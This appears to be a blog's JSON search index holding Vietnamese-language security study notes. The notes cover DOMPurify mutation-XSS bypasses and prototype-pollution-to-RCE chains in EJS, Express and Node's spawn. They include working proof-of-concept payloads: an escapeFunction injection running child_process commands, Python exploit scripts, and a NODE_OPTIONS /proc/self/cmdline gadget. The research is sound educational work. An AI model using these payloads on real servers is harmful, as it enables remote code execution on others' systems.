[{"content":" l3akctf2025 Performance Summary CTFs: 8/22 Total points: 3863 Position: 40 Rating points: 7.132 Writeups Category flagguessr dumber ","permalink":"http://localhost:1313/writeups/l3akctf2025/","title":"l3akctf2025"},{"content":" MaltaCTF 2025 Performance Summary Total points: 301 Position: 85 Rating points: ? Writeups Category Fancy ","permalink":"http://localhost:1313/writeups/maltactf2025/","title":"MaltaCTF 2025"},{"content":" DEEP DOWN TO DOMPURIFY Some note when learning mxss. Source : https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes\nDOWPURFIY WORKFLOWS : initDocument : Dùng API DOMParser để parse dữ liệu đúng như Browser parse createNodeIterator : Dùng API NodeIterator để iterate qua tất cả các node sanitizeElement : Kiểm tra tag allowed or not _sanitizeShadowDOM : The NodeIterator API doesn\u0026rsquo;t iterate over the template tag by default. Recursively sanitizes when it reaches a DocumentFragment. _sanitizeAttributes : dùng dom apis để sanitize HTML attributes . Output How MXSS happens : Vậy thì DOMPurify sử dụng cùng một hệ thống dom parser với browser vậy thì làm thế nào mà MXSS xảy ra . Có một vấn đề khá lớn đã được đề cập trong w3c : Parse một html string 2 lần có thể dẫn đến những kết quả khác nhau . Ví dụ : Dựa vào tính chất không chứa tag form trong form ta có thể khiến mutation xảy ra : Note : Kết quả domparser đầu tiên là thứ mà DOM purify thấy và đã check xong return về. Kết quả thứ 2 là những gì browser cho ra cuối cùng Đọc thêm ở : https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/?utm_source=chatgpt.com Foreign Content Hầu hết các element sẽ thuộc HTML namespace nhưng cũng có một vài element như svg và math thì svg và math sẽ thuộc cái namespace khác nhau gọi chung là Foreign Content .\nCụ thể có sự khác biệt giữa tag style trong HTML namespace vs SVG namespace . Trong html namespace thì trong style chỉ chứa text nhưng trong svg thì chứa cả element .Nhưng không hẳn là lúc nào trong foreign content thì cũng không chứa HTML namespace , ta sẽ có một vài điểm để bật html gọi là intergration point. Chỉ khi token đầu tiên trong mtext là mglyph hoặc malign mark Rules to decide the namespace : Node Flattening Một câu hỏi khá hay là DOM có thể sâu tới bao nhiêu layers ? Không có một giới hạn cụ thể nào nên phụ thuộc vào thư viện\nỒ vậy là chính DOM parser đã có limit là 512 nested Node và sẽ Flattening ? Ta có thể thấy khi vượt ngưỡng nó sẽ flat tag nested cuối cùng . Và kết quả sau khi reparse là : HTML Parsing State : Ta sẽ cần hiểu 2 concepts sau :\nInsertion modes Stack of open elements Ta sẽ tập trung vào insert modes của captions in table tag : Ta sẽ thấy nếu như đang trong mode in caption mà gặp thêm một tag caption nữa thì sẽ pop stack cho tới khi caption được pop out ra sau đó chuyển về in tables mode . Stack đơn giản là đọc từ trên xuống và đưa vào stack khi là start tag và pop khi là close tag . Vậy what could go wrong. Ta nhìn vào snippet sau :\n\u0026lt;table\u0026gt; \u0026lt;caption\u0026gt; \u0026lt;div\u0026gt;before\u0026lt;/div\u0026gt; \u0026lt;caption\u0026gt;\u0026lt;/caption\u0026gt; \u0026lt;div\u0026gt;after\u0026lt;/div\u0026gt; \u0026lt;/caption\u0026gt; \u0026lt;/table\u0026gt; Khi parser đọc đến caption tag đầu tiên nó sẽ được vào stack và khi chạm phải open tag caption tiếp theo nó sẽ bắt đầu close tag cho đến khi caption đã được pop out khỏi tag và switch sang intable mode dẫn đến việc trên stack không tồn tại caption nữa và tag \u0026lt;/caption\u0026gt; cũng vô nghĩa =\u0026gt; div after sẽ bị chuyển về intable modes nhưng vì divs cũng không hợp lệ trong tables dẫn đến bị pop out ra và cho kết quả như sau : Nhưng có một vấn đề cuối cùng là caption không thể được nest như trong snippet thế nên để bypass cái này thì ta sẽ lợi dụng Node Flattening và kết quả là : Ta đã có caption nested in caption và mxss go here\nFinal payload : https://yeswehack.github.io/Dom-Explorer/frame?input=editable\u0026amp;titleBar=readonly\u0026amp;readonly=true\u0026amp;pipe[titleBar]=true\u0026amp;pipe[settings]=true\u0026amp;pipe[render]=true\u0026amp;pipe[skip]=true/#eyJpbnB1dCI6IjxkaXYqNTA2PlxuPHRhYmxlPlxuICA8Y2FwdGlvbj5cbiAgICA8c3ZnPlxuICAgICAgPHRpdGxlPlxuICAgICAgICA8dGFibGU+PGNhcHRpb24+PC9jYXB0aW9uPjwvdGFibGU+XG4gICAgICA8L3RpdGxlPlxuICAgICAgPHN0eWxlPjxhIGlkPVwiPC9zdHlsZT48aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoKT5cIj48L2E+PC9zdHlsZT5cbiAgICA8L3N2Zz5cbiAgPC9jYXB0aW9uPlxuPC90YWJsZT4iLCJwaXBlbGluZXMiOlt7ImlkIjoiMGFkcXN1YWoiLCJuYW1lIjoiRG9tIFRyZWUiLCJwaXBlcyI6W3sibmFtZSI6IkRvbVB1cmlmeSIsImlkIjoiZXJsNXR6ZXMiLCJoaWRlIjp0cnVlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ2ZXJzaW9uIjoiMy4xLjAiLCJvcHRpb25zIjoie30ifX0seyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJiNTRyd2RiNSIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ== BUMP ELEMENT CÁI GÌ ĐANG XẢY RA Ở ĐÂY V ? : Cùng đọc docs nhé https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-intable\nCó vẻ là do\u0026lt;/form\u0026gt; nên mới bug ở đây Xóa start form thì vẫn ăn =)) vậy tức là do thằng cu \u0026lt;/form\u0026gt; mẹ ròi\nVi \u0026lt;/form\u0026gt; la invalid tag sẽ fallback về foster parenting Cơ chế foster parenting Trong HTML parsing, foster parenting là một cơ chế đặc biệt được quy định trong HTML parsing algorithm để xử lý một số trường hợp không hợp lệ (misnested), cụ thể là khi bạn chèn các thẻ không hợp lệ vào giữa các thẻ như \u0026lt;table\u0026gt;, \u0026lt;tbody\u0026gt;, \u0026lt;tr\u0026gt;, v.v.\nVí dụ trường hợp là tag h1 Thì sẽ được đẩy vào form , vì form không thể chứa \u0026lt;form\u0026gt; như ta đã biết nhưng còn **\u0026lt;/form\u0026gt;** thì sao ? Khi nhảy ra ngoài form nó cũng không valid nên nó nhảy ra tới tag body và vì thế ôm luôn thằng div ?? Sau một hồi test thì có vẻ không phải như vậy. Vậy nguyên nhân là do đâu mà BUMP hoạt động ?\nFinal : Sau một hồi đọc docx thì mình cũng nhận ra điều sau : Ta thấy khi gặp \u0026lt;/form\u0026gt; sẽ có những action sau, đặc biệt là 2. và 3. khi kết hợp lại có thể xóa đi một form element pointer nhưng vẫn không xóa node đó khỏi stack Điều kiện số 3 sẽ kiểm tra có node trong scope hay không ? Thế nghĩa là sao ? Ta nhìn vào đoạn sau : Hiểu đơn giản là : Một phần tử được coi là \u0026ldquo;in scope\u0026rdquo; nếu nó nằm trên stack, và không bị \u0026ldquo;che mất\u0026rdquo; bởi các phần tử đặc biệt khác như table, select, template, etc.\nKhi được foster parenting stack hiện là : [body , form , table ] với table là blocking tag nên khi trigger \u0026lt;/form\u0026gt; sẽ trigger trường hợp thứ ba nhưng đồng thời set form element về null dẫn đến \u0026lt;/form\u0026gt; cuối cùng không đóng form này lại được . và form vẫn nằm trên stack và nhận children =)))) =\u0026gt; \u0026lt;/form\u0026gt; đã bị chặn bởi tag table\nTổng kết flow như sau : Dựa trên điều đó ta có thể thay thế blocking scope tag và có cùng effect : ","permalink":"http://localhost:1313/writeups/mxss/","title":"Some note on MXSS"},{"content":" DEEP DOWN TO EJS Example usage : Đơn giản như sau thui : const ejs = require(\u0026quot;ejs\u0026quot;) const template = '\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;'; ejs.clearCache(); const data = { name: \u0026quot;12113awefeaw\u0026quot; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works Ta cùng đọc qua về hàm render :\nexports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); // No options object -- if there are optiony names // in the data, copy them to options if (arguments.length == 2) { utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA); } return handleCache(opts, template)(data); }; Hàm nhận vào data và options . Nếu không có options thì kiểu tra data xem có key nào có thể cho vào OPTIONS hay không theo danh sách trên : var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug', 'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async']; Sau đó gọi hàm handleCache nhận về một function và cho data làm đối số. Vậy ta sẽ phải tìm hiểu hàm handleCache sẽ trả về function gì . handleCache :\nfunction handleCache(options, template) { var func; var filename = options.filename; var hasTemplate = arguments.length \u0026gt; 1; if (options.cache) { if (!filename) { throw new Error('cache option requires a filename'); } func = exports.cache.get(filename); if (func) { return func; } if (!hasTemplate) { template = fileLoader(filename).toString().replace(_BOM, ''); } } else if (!hasTemplate) { // istanbul ignore if: should not happen at all if (!filename) { throw new Error('Internal EJS error: no file name or template ' + 'provided'); } template = fileLoader(filename).toString().replace(_BOM, ''); } func = exports.compile(template, options); if (options.cache) { exports.cache.set(filename, func); } return func; } Trước hết nó sẽ kiểm tra options cache xem có hay không sau đó sẽ dùng filename đó đưa vào hàm cache.get(filename) để nhận về một function thứ mà ta có thể đưa data vào để nhận được template cuối cùng. Trường hợp không có cache thì sẽ dùng hàm compile với template và options được truyền vào. compile function :\nexports.compile = function compile(template, opts) { var templ; // v1 compat // 'scope' is 'context' // FIXME: Remove this in a future version if (opts \u0026amp;\u0026amp; opts.scope) { if (!scopeOptionWarned) { console.warn('`scope` option is deprecated and will be removed in EJS 3'); scopeOptionWarned = true; } if (!opts.context) { opts.context = opts.scope; } delete opts.scope; } templ = new Template(template, opts); return templ.compile(); }; Tạo một Object template và trả về kết quả sau khi gọi hàm templ.compile() Class Template khá lớn nên mình sẽ tập trung vào hàm compile của nó . Hàm compile này là core function để tạo nên một function sẽ nhận data và trả về template. Trước khi đọc các giai đoạn nó tạo ra hàm thì ta có thể đơn giản là log hàm đó ra : function anonymous(data) { var include = function (path, includeData) { var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data); if (includeData) { d = utils.shallowCopy(d, includeData); } return includeFile(path, opts)(d); }; return fn.apply(opts.context, [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]); } Copy data các kiểu xong sẽ dùng hàm fn.apply vậy ta cần biết fn ở đây là hàm gì . Đọc source ta có thẻ thấy đoạn sau : var returnedFn = opts.client ? fn : function anonymous(data) { var include = function (path, includeData) { var d = utils.shallowCopy(utils.createNullProtoObjWherePossible(), data); if (includeData) { d = utils.shallowCopy(d, includeData); } return includeFile(path, opts)(d); }; console.log(fn.toString()) return fn.apply(opts.context, [data || utils.createNullProtoObjWherePossible(), escapeFn, include, rethrow]); }; Với options.client =0 thì ta sẽ nhận được hàm trên và fn ở đây sau khi log ra thì ta có : function anonymous(locals, escapeFn, include, rethrow ) { var __line = 1 , __lines = \u0026quot;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026quot; , __filename = undefined; try { var __output = \u0026quot;\u0026quot;; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s } with (locals || {}) { ; __append(\u0026quot;\u0026lt;h1\u0026gt;Hello \u0026quot;) ; __append(escapeFn( name )) ; __append(\u0026quot;\u0026lt;/h1\u0026gt;\u0026quot;) } return __output; } catch (e) { rethrow(e, __lines, __filename, __line, escapeFn); } } Đến đây ta hoàn toàn có thể thấy được logic mà name được đưa vào template. Khá phức tạp ở đây nhưng ta sẽ tiếp tục đọc vào hàm này. Đây là source generate được đống function trên bằng cách ghép nhiều chuỗi với nhau if (!this.source) { this.generateSource(); prepended += ' var __output = \u0026quot;\u0026quot;;\\n' + ' function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s }\\n'; if (opts.outputFunctionName) { if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) { throw new Error('outputFunctionName is not a valid JS identifier.'); } prepended += ' var ' + opts.outputFunctionName + ' = __append;' + '\\n'; } if (opts.localsName \u0026amp;\u0026amp; !_JS_IDENTIFIER.test(opts.localsName)) { throw new Error('localsName is not a valid JS identifier.'); } if (opts.destructuredLocals \u0026amp;\u0026amp; opts.destructuredLocals.length) { var destructuring = ' var __locals = (' + opts.localsName + ' || {}),\\n'; for (var i = 0; i \u0026lt; opts.destructuredLocals.length; i++) { var name = opts.destructuredLocals[i]; if (!_JS_IDENTIFIER.test(name)) { throw new Error('destructuredLocals[' + i + '] is not a valid JS identifier.'); } if (i \u0026gt; 0) { destructuring += ',\\n '; } destructuring += name + ' = __locals.' + name; } prepended += destructuring + ';\\n'; } if (opts._with !== false) { prepended += ' with (' + opts.localsName + ' || {}) {' + '\\n'; appended += ' }' + '\\n'; } appended += ' return __output;' + '\\n'; this.source = prepended + this.source + appended; } if (opts.compileDebug) { src = 'var __line = 1' + '\\n' + ' , __lines = ' + JSON.stringify(this.templateText) + '\\n' + ' , __filename = ' + sanitizedFilename + ';' + '\\n' + 'try {' + '\\n' + this.source + '} catch (e) {' + '\\n' + ' rethrow(e, __lines, __filename, __line, escapeFn);' + '\\n' + '}' + '\\n'; } else { src = this.source; } if (opts.client) { src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\\n' + src; if (opts.compileDebug) { src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\\n' + src; } } if (opts.strict) { src = '\u0026quot;use strict\u0026quot;;\\n' + src; } if (opts.debug) { console.log(src); } if (opts.compileDebug \u0026amp;\u0026amp; opts.filename) { src = src + '\\n' + '//# sourceURL=' + sanitizedFilename + '\\n'; } Đến đây ta đã biết rằng hàm sau sẽ được execute và hàm được tạo bởi các string ghép lại ? Vậy sẽ thế nào nếu ta có thẻ input tùy ý vào hàm này qua options của ejs? Từ đó lấy RCE ? Ta sẽ đi tìm một vài điểm nào đó có thể cho ta input vào . Nhìn sơ ta có thể thấy if (opts.outputFunctionName) { if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) { throw new Error('outputFunctionName is not a valid JS identifier.'); } prepended += ' var ' + opts.outputFunctionName + ' = __append;' + '\\n'; } Nhưng vì có regrex khá căng nên cũng không khả thi lắm. Riêng chỉ có đoạn này :\nif (opts.client) { src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\\n' + src; if (opts.compileDebug) { src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\\n' + src; } } Well cả 2 biến client và escapeFn đều được lấy từ options object vào ? Sẽ ra sao nếu ta split javascript code với \u0026ldquo;;\u0026rdquo; và chèn rce code vào ?\nconst ejs = require(\u0026quot;ejs\u0026quot;) const template = '\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;'; escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; const data = { name: \u0026quot;12113awefeaw\u0026quot; } const compiled = ejs.render(template, data, { client: 1, escapeFunction: escapeFunction }); // not works console.log(compiled.toString()) Khi này function sau sẽ được generate ra :\nfunction anonymous(locals, escapeFn, include, rethrow ) { rethrow = rethrow || function rethrow(err, str, flnm, lineno, esc) { var lines = str.split('\\n'); var start = Math.max(lineno - 3, 0); var end = Math.min(lines.length, lineno + 3); var filename = esc(flnm); // Error context var context = lines.slice(start, end).map(function (line, i) { var curr = i + start + 1; return (curr == lineno ? ' \u0026gt;\u0026gt; ' : ' ') + curr + '| ' + line; }).join('\\n'); // Alter exception message err.path = filename; err.message = (filename || 'ejs') + ':' + lineno + '\\n' + context + '\\n\\n' + err.message; throw err; }; /*OUR OPTIONS GOES IN HERE */ escapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());; var __line = 1 , __lines = \u0026quot;\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;\u0026quot; , __filename = undefined; try { var __output = \u0026quot;\u0026quot;; function __append(s) { if (s !== undefined \u0026amp;\u0026amp; s !== null) __output += s } with (locals || {}) { ; __append(\u0026quot;\u0026lt;h1\u0026gt;Hello \u0026quot;) ; __append(escapeFn( name )) ; __append(\u0026quot;\u0026lt;/h1\u0026gt;\u0026quot;) } return __output; } catch (e) { rethrow(e, __lines, __filename, __line, escapeFn); } } Và ta đã có thể chạy bất kì js command nào !!!\nescapeFn = escapeFn || JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());; Prototype pollution to RCE . Nhưng trong thực tế ta sẽ không kiểm soát được options được chèn vào . Vậy sẽ ra sao nếu ta có một prototype pollution ở phía server ? Test với đoạn code sau : const ejs = require(\u0026quot;ejs\u0026quot;) const template = '\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;'; ejs.clearCache(); escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; Object.prototype.client = true Object.prototype.escapeFunction = escapeFunction const data = { name: \u0026quot;12113awefeaw\u0026quot; } const compiled = ejs.render(template, data); // not works console.log(compiled.toString()) Hmmmm , ta thấy không có gì xảy ra cả vì nếu để ý từ đầu đoạn code đã có một phần check rất rõ :\nexports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); } Điều này đã block việc protoytpe pollution nhưng có một vấn đề là nhiều project ở ngoài kia sẽ không bao giờ để trống options field và đơn giản sẽ truyền vào đó một empty object ~ ~!! chính điều này là root cause cho việc bypass này , để simluate ta đơn giản chỉ cần truyền {} vào là đc .\nconst ejs = require(\u0026quot;ejs\u0026quot;) const template = '\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;'; ejs.clearCache(); escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; Object.prototype.client = true Object.prototype.escapeFunction = escapeFunction const data = { name: \u0026quot;12113awefeaw\u0026quot; } const compiled = ejs.render(template, data, {}); // works now with polluted {} console.log(compiled.toString()) Tèn ten , điều này hoạt động vì hàm render sẽ ưu tiên nhận object từ ngoài vào. Express js Để kiểm chứng việc truyền object trống vào options ta có thể xem sơ qua source của express js ta sẽ thấy đoạn sau : Vì luôn có options object nên Express default cũng có thể bị lỗi này . POC : Server.js :\nconst express = require('express'); const path = require('path'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); // Set EJS as the template engine app.set('view engine', 'ejs'); // Set the views directory app.set('views', path.join(__dirname, 'views')); app.post(\u0026quot;/pollute_me\u0026quot;, (req, res) =\u0026gt; { // Prototype pollution vulnerability here Object.assign(Object.prototype, req.body); console.log({}.client) res.send('Updated!'); }) // Define a simple route app.get('/', (req, res) =\u0026gt; { res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' }); }); // Start the server const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); ex.py :\nimport requests url = \u0026quot;http://localhost:3000\u0026quot; escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; data = { \u0026quot;client\u0026quot; : '123' , \u0026quot;escapeFunction\u0026quot; : escapeFunction } res = requests.post(url+'/pollute_me' ,json=data) print(res.text) requests.get(url) Express views use a default config when calling templating function, which make it vulnerable by default!\nAnother gadget : Sẽ ra sao nếu ta không có prototype pollution nhưng có thể handle được biến data ? Khi express gọi tới render bản chất nó sẽ gọi tới export.__express // default engine export var fn = require(mod).__express Ejs :\n/** * Express.js support. * * This is an alias for {@link module:ejs.renderFile}, in order to support * Express.js out-of-the-box. * * @func */ exports.__express = exports.renderFile; Vậy bản chất của express sẽ gọi tới hàm renderFile :\nexports.renderFile = function () { var args = Array.prototype.slice.call(arguments); var filename = args.shift(); var cb; var opts = { filename: filename }; var data; var viewOpts; // Do we have a callback? if (typeof arguments[arguments.length - 1] == 'function') { cb = args.pop(); } // Do we have data/opts? if (args.length) { // Should always have data obj data = args.shift(); // Normal passed opts (data obj + opts obj) if (args.length) { // Use shallowCopy so we don't pollute passed in opts obj with new vals utils.shallowCopy(opts, args.pop()); } // Special casing for Express (settings + opts-in-data) else { // Express 3 and 4 if (data.settings) { // Pull a few things from known locations if (data.settings.views) { opts.views = data.settings.views; } if (data.settings['view cache']) { opts.cache = true; } // Undocumented after Express 2, but still usable, esp. for // items that are unsafe to be passed along with data, like `root` viewOpts = data.settings['view options']; if (viewOpts) { utils.shallowCopy(opts, viewOpts); } } // Express 2 and lower, values set in app.locals, or people who just // want to pass options in their data. NOTE: These values will override // anything previously set in settings or settings['view options'] utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS); } opts.filename = filename; } else { data = utils.createNullProtoObjWherePossible(); } return tryHandleCache(opts, data, cb); }; Hàm này khá tương đồng với hàm render bình thường nhưng sẽ có vài điểm đặc biệt đó là :\nviewOpts = data.settings['view options']; if (viewOpts) { utils.shallowCopy(opts, viewOpts); } Ta có thể thấy ở đây , data có thể ảnh hưởng trực tiếp tới biến opts và từ đó chẳng khác gì ta có thể kiểm soát biển opts và lấy rce . POC : server.js :\nconst express = require('express'); const path = require('path'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); // Set EJS as the template engine app.set('view engine', 'ejs'); // Set the views directory app.set('views', path.join(__dirname, 'views')); app.post(\u0026quot;/pollute_me\u0026quot;, (req, res) =\u0026gt; { // Prototype pollution vulnerability here const data = { title: 'Hello EJS', message: 'Welcome to EJS Template!' } Object.assign(data, req.body); res.render('index', data) }) // Define a simple route app.get('/', (req, res) =\u0026gt; { res.render('index', { title: 'Hello EJS', message: 'Welcome to EJS Template!' }); }); // Start the server const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); ex.py :\nimport requests url = \u0026quot;http://localhost:3000\u0026quot; escapeFunction = \u0026quot;JSON.stringify; console.log(1337);let cp = process.mainModule.require('child_process');console.log(cp.execSync('id').toString());\u0026quot; data = { \u0026quot;settings\u0026quot; : { \u0026quot;view options\u0026quot; : { \u0026quot;client\u0026quot; : '123' , \u0026quot;escapeFunction\u0026quot; : escapeFunction } } } res = requests.post(url+'/pollute_me' ,json=data) print(res.text) requests.get(url) Lưu ý: gadget trên chỉ hoạt động khi kiểm soát được property trực tiếp của data chứ không phải proottype pollution vì khi parse renderOptions , nó chỉ copy các own property thui chứ không dùng luôn cả objects đấy. var renderOptions = { ...this.locals, ...opts._locals, ...opts }; How it get patched Vì root cause ở đây là do hàm generate Template function nhận opts mà không kiểm tra kĩ nên patch đơn giản nhưu sau : https://github.com/mde/ejs/compare/v3.1.9%2e%2e%2ev3.1.10 Nó sẽ kiểm tra các biến có phải là property trực tiếp hay không sau đó trả copy vào một Null Object và returns về . Không biết có bypass đc ko :v Nhìn chung nếu ta có thể kiểm soát biến data (not prototype pollution) thì rce vẫn posssible .\nMột vài điểm thú vị về for in : Xét ví dụ sau :\nscripts = { \u0026quot;pace\u0026quot;: \u0026quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js\u0026quot;, \u0026quot;main\u0026quot;: \u0026quot;/main.js\u0026quot;, } Object.prototype.polluted = \u0026quot;WTF\u0026quot; console.log(\u0026quot;Just log it out : \u0026quot;, scripts) for (let script in scripts) { console.log(\u0026quot;[\u0026quot; + script + \u0026quot;] =\u0026gt; \u0026quot; + scripts[script]) } Kết quả sẽ có chứa polluted không ? Câu trả lời là có : Đọc tí document về tính chất của for in ta có thể thấy rằng https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties Nó sẽ chấp nhận luôn cả những enumerable là inherited từ Object prototype ! Bài này mình thấy ở malta ctf khá hay (mặc dù mình k giải ra:( )\nUniversal Gadget https://portswigger.net/web-security/prototype-pollution/server-side\nNgoài ra có một gadget khá nguy hiểm đối với các phiên bản Node js cũ khi spawn một process mới . function spawn(file, args, options) { const child = new ChildProcess(); options = normalizeSpawnArguments(file, args, options); debug('spawn', options); child.spawn(options); return child; } Hàm trên sẽ tạo một process và truyền options được lấy từ normalizeSpawnArguments Vấn đề ở đây là hàm trên có một bug về pp .\nconst env = options.env || process.env; const envPairs = []; // Prototype values are intentionally included. for (const key in env) { const value = env[key]; if (value !== undefined) { envPairs.push(`${key}=${value}`); } } return { // Make a shallow copy so we don't clobber the user's options object. ...options, args, detached: !!options.detached, envPairs, file, windowsHide: !!options.windowsHide, windowsVerbatimArguments: !!windowsVerbatimArguments }; Như ta đã biết vòng for in ở đây sẽ loop qua cả các prototype và dường như điều này đã được các developer intend nhưng mà không hiểu sao lại intend v nữa : ) Vậy spawn một process mới và kiểm soát được options thì ta có thể làm được gì ? Có một options khá thú vị nếu như ta spawn một node process . Đó là NODE_OPTIONS : https://nodejs.org/api/cli.html#node_optionsoptions Và ta có thể thấy : Kết hợp điều này với gadget trên thì ta có thể dễ dàng lấy RCE . Vậy làm sao có thể làm được khi ta không có thể tạo file ? Ta có thể lợi dụng các file đặc biệt như /proc/self/environ như ví dụ ở Kibana nhưng điều này đã bị chặn và không còn khả thi vì node js đã fixx lỗi này và luôn đặt environ ở cuối cùng. Vậy là sao để bypass ? Ta sẽ lợi dụng một file đặc biệt là file /proc/self/cmdline là file sẽ trả về argv[0] ví dụ : const { spawn } = require(\u0026quot;child_process\u0026quot;); const ls = spawn(\u0026quot;node\u0026quot;, [\u0026quot;rce.js\u0026quot;], { env: { ...process.env, // inherit parent env }, stdio: \u0026quot;inherit\u0026quot; // pipe output directly to parent terminal }); rce.js :\nconst fs = require(\u0026quot;fs\u0026quot;); const cmdline = fs.readFileSync(\u0026quot;/proc/self/cmdline\u0026quot;); console.log(cmdline.toString().split(\u0026quot;\\0\u0026quot;)); Khi này ta sẽ thấy argv[0] tương đương với \u0026rsquo;node\u0026rsquo; :\nVà điều đặc biệt là spawn function có hỗ trợ chức năng set argv[0] mà không làm thay đổi executable file . const { spawn } = require(\u0026quot;child_process\u0026quot;); const ls = spawn(\u0026quot;node\u0026quot;, [\u0026quot;rce.js\u0026quot;], { argv0: \u0026quot;abc\u0026quot;, env: { ...process.env, // inherit parent env }, stdio: \u0026quot;inherit\u0026quot; // pipe output directly to parent terminal }); Kết hợp điều này với NODE_OPTIONS và /proc/self/cmdline ta có payload như sau :+1:\nconst { spawn } = require(\u0026quot;child_process\u0026quot;); const ls = spawn(\u0026quot;node\u0026quot;, [\u0026quot;rce.js\u0026quot;], { argv0: \u0026quot;console.log(123);//\u0026quot;, env: { ...process.env, // inherit parent env NODE_OPTIONS: \u0026quot;--require /proc/self/cmdline\u0026quot; }, stdio: \u0026quot;inherit\u0026quot; // pipe output directly to parent terminal }); Cuối cùng kết hợp với prototype pollution thì ta sẽ dễ dàng có được rce . const { spawn } = require(\u0026quot;child_process\u0026quot;); Object.prototype.env = {}; // dummy object Object.prototype.env.NODE_OPTIONS = \u0026quot;--require /proc/self/cmdline\u0026quot;; // trigger loadJ Object.prototype.argv0 = `require(\u0026quot;child_process\u0026quot;).execSync(\u0026quot;id \u0026gt; pwn\u0026quot;);//`; spawn(\u0026quot;node\u0026quot;); So sánh _proto_ và constructor.prototype? Như mọi người ai cũng biết là khi làm prototype pollution ta thường dùng các key như \u0026ldquo;proto\u0026rdquo; hay \u0026ldquo;constructor.prototype\u0026rdquo; để access được Object.prototype nhưng vì sao lại như vậy ?\nConstructor.prototype : Ta có thể hiểu đơn giản là lấy prototype của constructor đó . Nhìn vào đoạn code sau : const a = {} ; // Tương đương với const a = Object.create(Object.prototype) Hàm Object.create sẽ tạo một object và sử dụng một Object đang tồn tại làm prototype cho chúng và lưu vào __proto__ . Còn constructor là trỏ về object và lấy prootytpe của Object . Nên vô tình sẽ khiến cho __proto__ == Object.prototype __proto__ Sẽ có các trường hợp __proto__ sẽ khác với constructor.prototype như : Ví dụ trên trang chính vậy. Khi này __proto__ == person. Còn constructor của nó vẫn là Object nên đơn giản trả về Object prototype Các method để lấy Prototype Cái nì mình tóm tắt trick lỏ lấy được từ X thôi :v https://x.com/arkark_/status/1943260773268230205?s=46 Challenges : Mình có làm một challenge nhỏ , mọi người có thể chơi thử và nếu có thắc mắc thì có thể DM mình nhé : https://drive.google.com/file/d/1Me7WBTw2pHqhwHM2lQncnwmwlcfF3IEw/view?usp=sharing Lần đầu mình làm chall nên chắc sẽ có nhiều bug unintend đấy :v Resource : https://nodejs.org/api/cli.html#cli_node_options_options https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain#prototype_and_object.getprototypeof https://www.sonarsource.com/blog/blitzjs-prototype-pollution/ https://www.usenix.org/system/files/usenixsecurity23-shcherbakov.pdf https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/\n","permalink":"http://localhost:1313/writeups/pp2rce/","title":"Some note on Prototype pollution to RCE"},{"content":" Nothing \u0026hellip;. ","permalink":"http://localhost:1313/news/cookiefarmv1.0.1/","title":"Nothing here"}]